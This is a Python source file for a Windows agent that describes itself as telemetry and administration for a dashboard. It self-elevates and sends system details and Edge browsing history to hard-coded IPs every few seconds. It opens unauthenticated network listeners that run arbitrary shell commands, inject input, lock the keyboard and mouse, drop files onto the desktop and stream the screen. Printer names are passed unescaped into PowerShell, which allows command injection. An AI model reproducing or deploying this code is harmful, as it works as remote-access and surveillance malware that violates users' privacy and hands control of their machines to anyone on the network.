import os
import sys
import time
import json
import socket
import sqlite3
import shutil
import platform
import subprocess
import threading
import io
import base64
import ctypes
import keyboard  
import mouse  

DASHBOARD_IPS = ["192.168.1.4", "172.65.21.7", "172.65.21.90", "172.65.21.1"]
TELEMETRY_PORT = 5005
LISTEN_COMMAND_PORT = 6006
STREAM_SERVER_PORT = 7007      

EDGE_HISTORY_DIR = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default")
EDGE_HISTORY_FILE = os.path.join(EDGE_HISTORY_DIR, "History")

hardware_lock_state = {
    "Keyboard": False,
    "Printer": {},
    "PnpDevices": {}
}

mouse_hook_instance = None

def is_admin():
    try: return ctypes.windll.shell32.IsUserAnAdmin()
    except: return False

def fetch_system_specs():
    try:
        cmd_ram = 'powershell -ExecutionPolicy Bypass -NoProfile -Command "(Get-CimInstance Win32_OperatingSystem).TotalVisibleMemorySize"'
        ram_raw = subprocess.check_output(cmd_ram, shell=True).decode().strip()
        ram_gb = round(int(ram_raw) / (1024**2))
    except: ram_gb = "Unknown"
    return {
        "hostname": socket.gethostname(),
        "os": f"{platform.system()} {platform.release()}",
        "cpu": platform.processor(),
        "ram": f"{ram_gb} GB RAM" if isinstance(ram_gb, int) else ram_gb
    }

def gather_pnp_hardware_assets():
    devices = []
    target_classes = "'Mouse', 'Keyboard', 'Camera', 'Image', 'USB', 'DiskDrive', 'PrintQueue', 'Printer'"
    cmd_pnp = f'powershell -ExecutionPolicy Bypass -NoProfile -Command "Get-PnpDevice -PresentOnly | Where-Object {{$_.Class -in ({target_classes})}} | Select-Object FriendlyName, Class, InstanceId, Status | ConvertTo-Json -Compress"'
    try:
        out = subprocess.check_output(cmd_pnp, shell=True).decode('utf-8', errors='ignore').strip()
        if out:
            data = json.loads(out)
            if isinstance(data, dict): data = [data]
            for item in data:
                name = item.get("FriendlyName", "")
                if "root" in name.lower() or "controller" in name.lower() or "hub" in name.lower(): continue
                item_class = item.get("Class", "Peripheral")
                instance_id = item.get("InstanceId", "")
                
                # Dynamic validation logic across state registries
                if item_class == "Keyboard" and hardware_lock_state["Keyboard"]: 
                    display_status = "BLOCKED"
                elif item_class in ["PrintQueue", "Printer"] and hardware_lock_state["Printer"].get(name, False): 
                    display_status = "BLOCKED"
                elif hardware_lock_state["PnpDevices"].get(instance_id, False):
                    # Direct lookup tracking for standard PnP blocks
                    display_status = "BLOCKED"
                else:
                    raw_status = item.get("Status", "Unknown")
                    # Fallback validation verification mapping
                    if raw_status in ["Error", "Degraded", "Disabled"]:
                        display_status = "BLOCKED"
                    else:
                        display_status = "Active"
                
                # NOTE: Ensure key fits 'mfg' pattern mapping to match dashboard expectations
                devices.append({"name": name, "type": item_class, "status": display_status, "raw_id": instance_id})
    except: pass
    return devices

def gather_browsing_history():
    logs = []
    if not os.path.exists(EDGE_HISTORY_FILE): return logs
    temp_db = "edge_hist_temp.db"
    try:
        shutil.copy2(EDGE_HISTORY_FILE, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT url, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 35")
        for row in cursor.fetchall():
            try: converted_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime((row[1] / 1000000) - 11644473600))
            except: converted_time = "Recent Visit"
            logs.append({"site": row[0], "ip": converted_time})
        conn.close()
    except: pass
    if os.path.exists(temp_db):
        try: os.remove(temp_db)
        except: pass
    return logs

def package_and_transmit_telemetry():
    payload = fetch_system_specs()
    payload["devices"] = gather_pnp_hardware_assets()
    payload["history"] = gather_browsing_history()
    data_bytes = json.dumps(payload).encode('utf-8')
    data_len = len(data_bytes)
    for host_ip in DASHBOARD_IPS:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(3.0)
                s.connect((host_ip, TELEMETRY_PORT))
                s.sendall(data_len.to_bytes(4, byteorder='big'))
                s.sendall(data_bytes)
        except: pass

def cyclic_heartbeat_loop():
    while True:
        package_and_transmit_telemetry()
        time.sleep(6)

def enforce_system_lock():
    global mouse_hook_instance
    keyboard.hook(lambda e: False, suppress=True)
    if mouse_hook_instance is None: mouse_hook_instance = mouse.hook(lambda e: False)

def release_system_lock():
    global mouse_hook_instance
    try: keyboard.unhook_all()
    except: pass
    if mouse_hook_instance is not None:
        try: mouse.unhook(mouse_hook_instance)
        except: pass
        mouse_hook_instance = None

def process_administrative_enforcement(client_socket):
    import pyautogui
    pyautogui.FAILSAFE = False
    try:
        len_bytes = b""
        while len(len_bytes) < 4:
            chunk = client_socket.recv(4 - len(len_bytes))
            if not chunk: return
            len_bytes += chunk
        target_payload_size = int.from_bytes(len_bytes, byteorder='big')
        buffer = b""
        while len(buffer) < target_payload_size:
            chunk = client_socket.recv(min(target_payload_size - len(buffer), 65536))
            if not chunk: break
            buffer += chunk
        if len(buffer) < target_payload_size: return 
        
        directive = json.loads(buffer.decode('utf-8'))
        action = directive.get("action")
        screen_width, screen_height = pyautogui.size()

        if action == "mouse_move":
            target_x = int(directive.get("x", 0) * screen_width)
            target_y = int(directive.get("y", 0) * screen_height)
            pyautogui.moveTo(target_x, target_y)
            return
        elif action == "mouse_click":
            target_x = int(directive.get("x", 0) * screen_width)
            target_y = int(directive.get("y", 0) * screen_height)
            btn = directive.get("button", "left")
            state = directive.get("state", "down")
            pyautogui.moveTo(target_x, target_y)
            if state == "down": pyautogui.mouseDown(button=btn)
            else: pyautogui.mouseUp(button=btn)
            return
        elif action == "key_input":
            raw_key = directive.get("key", "")
            if not raw_key: return
            key_map = {"Return": "enter", "BackSpace": "backspace", "Tab": "tab", "Escape": "escape", "Delete": "delete", "space": "space", "Up": "up", "Down": "down", "Left": "left", "Right": "right"}
            resolved_key = key_map.get(raw_key, raw_key.lower())
            try: pyautogui.press(resolved_key)
            except: pass
            return
        elif action == "lock_input":
            hardware_lock_state["Keyboard"] = True
            enforce_system_lock()
            package_and_transmit_telemetry()
            return
        elif action == "unlock_input":
            hardware_lock_state["Keyboard"] = False
            release_system_lock()
            package_and_transmit_telemetry()
            return
        elif action == "execute_installer":
            cmd_string = directive.get("command")
            subprocess.Popen(cmd_string, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return

        elif action == "send_notification":
            notif_title = directive.get("title", "SYSTEM NOTICE")
            notif_msg = directive.get("message", "")
            
            # Helper function to run the custom persistent Tkinter UI window
            def spawn_custom_toast(title, message):
                import tkinter as tk
                
                # Initialize an isolated Tkinter root instance
                toast_win = tk.Tk()
                toast_win.title(title)
                
                # Enforce 'always-on-top' rule so it stays visible over everything
                toast_win.attributes("-topmost", True)
                toast_win.configure(bg="#FFFFFF") # Pure White Background
                
                # Strip raw OS window borders/decorations for a clean look
                toast_win.overrideredirect(True)
                
                # Dynamic screen placement tracking (anchored to bottom right corner)
                sw = toast_win.winfo_screenwidth()
                sh = toast_win.winfo_screenheight()
                win_w, win_h = 360, 140
                pos_x = sw - win_w - 20
                pos_y = sh - win_h - 60
                toast_win.geometry(f"{win_w}x{win_h}+{pos_x}+{pos_y}")
                
                # Subtle outer border frame container
                border_frame = tk.Frame(toast_win, bg="#CCCCCC", bd=1)
                border_frame.pack(fill=tk.BOTH, expand=True)
                
                inner_container = tk.Frame(border_frame, bg="#FFFFFF")
                inner_container.pack(fill=tk.BOTH, expand=True, padx=1, pady=1)
                
                # Dedicated Close Button ("×") - The ONLY way to close this window
                btn_close = tk.Button(
                    inner_container, 
                    text="×", 
                    font=("Segoe UI", 14, "bold"), 
                    fg="#666666", 
                    bg="#FFFFFF", 
                    activebackground="#F3F3F3",
                    activeforeground="#000000",
                    bd=0, 
                    cursor="hand2",
                    command=toast_win.destroy # Closes window immediately when clicked
                )
                btn_close.place(x=325, y=5, width=25, height=25)
                
                # Notification Category/Type Header (Black font)
                lbl_title = tk.Label(
                    inner_container, 
                    text=title.upper(), 
                    font=("Segoe UI", 11, "bold"), 
                    fg="#000000", # Black Text
                    bg="#FFFFFF",
                    anchor="w"
                )
                lbl_title.pack(fill=tk.X, padx=(15, 40), pady=(12, 5))
                
                # Notification Context Details (Black font with wrap)
                lbl_msg = tk.Label(
                    inner_container, 
                    text=message, 
                    font=("Segoe UI", 10), 
                    fg="#1A1A1A", # Dark Black Text
                    bg="#FFFFFF",
                    anchor="nw", 
                    justify=tk.LEFT,
                    wraplength=320
                )
                lbl_msg.pack(fill=tk.BOTH, expand=True, padx=15, pady=(0, 10))
                
                # Locks the window on screen indefinitely until the command is fired via btn_close
                toast_win.mainloop()

            # Dispatched inside an independent thread context so it doesn't interrupt core telemetry loops
            threading.Thread(target=spawn_custom_toast, args=(notif_title, notif_msg), daemon=True).start()
            return

        elif action == "drop_file":
            file_name = directive.get("file_name")
            b64_data = directive.get("file_data")
            if file_name and b64_data:
                target_desktop = None
                try:
                    cmd_user = 'powershell -ExecutionPolicy Bypass -NoProfile -Command "(Get-CimInstance Win32_ComputerSystem).UserName"'
                    raw_user = subprocess.check_output(cmd_user, shell=True).decode().strip()
                    if raw_user and "\\" in raw_user:
                        username = raw_user.split("\\")[1]
                        base_profile = f"C:\\Users\\{username}"
                        onedrive_path = os.path.join(base_profile, "OneDrive", "Desktop")
                        standard_path = os.path.join(base_profile, "Desktop")
                        if os.path.exists(onedrive_path): target_desktop = onedrive_path
                        elif os.path.exists(standard_path): target_desktop = standard_path
                except: pass

                if not target_desktop:
                    try:
                        import winreg
                        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"
                        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path) as registry_key:
                            desktop_dir, _ = winreg.QueryValueEx(registry_key, "Desktop")
                        target_desktop = os.path.expandvars(desktop_dir)
                    except:
                        target_desktop = os.path.join(os.environ["USERPROFILE"], "Desktop")

                os.makedirs(target_desktop, exist_ok=True)
                output_destination = os.path.join(target_desktop, file_name)

                try:
                    raw_file_bytes = base64.b64decode(b64_data.encode('utf-8'))
                    with open(output_destination, "wb") as out_f: out_f.write(raw_file_bytes)
                except:
                    public_destination = os.path.join(os.environ.get("PUBLIC", "C:\\Users\\Public"), "Desktop", file_name)
                    os.makedirs(os.path.dirname(public_destination), exist_ok=True)
                    with open(public_destination, "wb") as out_f: out_f.write(raw_file_bytes)
                
                package_and_transmit_telemetry()
            return

        target_id = directive.get("raw_id")
        device_type = directive.get("device_type", "")
        device_name = directive.get("device_name", "")

        if target_id or device_name:
            if device_type.strip().lower() in ["printqueue", "printer"]:
                if action == "block_device":
                    hardware_lock_state["Printer"][device_name] = True
                    full_command = f'powershell -ExecutionPolicy Bypass -NoProfile -Command "Get-PrintJob -PrinterName \'{device_name}\' | Remove-PrintJob; Pause-Printer -Name \'{device_name}\'"'
                else:
                    hardware_lock_state["Printer"][device_name] = False
                    full_command = f'powershell -ExecutionPolicy Bypass -NoProfile -Command "Resume-Printer -Name \'{device_name}\'"'
                subprocess.run(full_command, shell=True, capture_output=True)
                package_and_transmit_telemetry()
                return

            # TRACK GENERIC PNP BLOCKS
            if action == "block_device":
                hardware_lock_state["PnpDevices"][target_id] = True
            elif action == "unblock_device":
                hardware_lock_state["PnpDevices"][target_id] = False

            ps_action = "Enable-PnpDevice" if action == "unblock_device" else "Disable-PnpDevice"
            ps_script = f"{ps_action} -InstanceId '{target_id}' -Confirm:$false"
            full_command = f'powershell -ExecutionPolicy Bypass -NoProfile -Command "{ps_script}"'
            subprocess.run(full_command, shell=True, capture_output=True)
            package_and_transmit_telemetry()
            
    except Exception as e: pass
    finally:
        try: client_socket.close()
        except: pass

def command_listener_interface():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind(('0.0.0.0', LISTEN_COMMAND_PORT))
        server.listen(10)
    except: return
    while True:
        try:
            sock, _ = server.accept()
            threading.Thread(target=process_administrative_enforcement, args=(sock,), daemon=True).start()
        except: pass

def screen_stream_listener_interface():
    import pyautogui
    pyautogui.FAILSAFE = False
    stream_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    stream_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        stream_server.bind(('0.0.0.0', STREAM_SERVER_PORT))
        stream_server.listen(2)
    except: return
    while True:
        try:
            conn, _ = stream_server.accept()
            def serve_screen_stream_worker(c):
                try:
                    while True:
                        screenshot = pyautogui.screenshot().convert("RGB")
                        img_byte_arr = io.BytesIO()
                        screenshot.save(img_byte_arr, format='JPEG', quality=45)
                        img_bytes = img_byte_arr.getvalue()
                        c.sendall(len(img_bytes).to_bytes(4, byteorder='big'))
                        c.sendall(img_bytes)
                        time.sleep(0.05)
                except: pass
                finally:
                    try: c.close()
                    except: pass
            threading.Thread(target=serve_screen_stream_worker, args=(conn,), daemon=True).start()
        except: pass


if __name__ == "__main__":
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()
    
    package_and_transmit_telemetry()
    threading.Thread(target=cyclic_heartbeat_loop, daemon=True).start()
    threading.Thread(target=command_listener_interface, daemon=True).start()
    threading.Thread(target=screen_stream_listener_interface, daemon=True).start()
    
    while True: time.sleep(1)